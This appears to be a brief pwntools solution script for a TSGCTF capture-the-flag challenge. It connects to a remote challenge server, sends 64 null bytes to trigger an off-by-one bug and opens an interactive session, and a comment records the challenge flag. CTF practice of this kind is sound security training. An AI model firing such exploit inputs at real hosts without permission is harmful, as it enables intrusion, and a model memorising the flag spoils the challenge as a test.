# Python 3

# Flag : TSGCTF{just_a_simple_off_by_one-chall_isnt_it}

from pwn import *

c = remote("34.146.101.4", 30007)

print(c.recvuntil("\n"))
c.sendline(b"\x00"*64)
print(c.recvuntil("\n"))

c.interactive()
